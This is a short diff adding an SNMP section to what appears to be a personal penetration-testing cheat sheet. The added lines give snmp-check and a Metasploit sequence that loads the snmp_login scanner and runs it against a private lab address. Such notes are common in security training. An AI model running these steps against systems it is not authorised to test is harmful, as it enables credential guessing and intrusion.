@@ -115,6 +115,17 @@ Ftp:
 
 -> cat <target.txt> 
 
+SNMP:
+-> snmp-check 192.168.0.108
+to exploit try this way
+#msfconsole
+>search snmp
+>use auxiliary/scanner/snmp/snmp_login
+>show options
+>ip a
+>set RHOSTS 192.168.0.104
+>show options
+>exploit
 
 SQL: 
 Sqli 
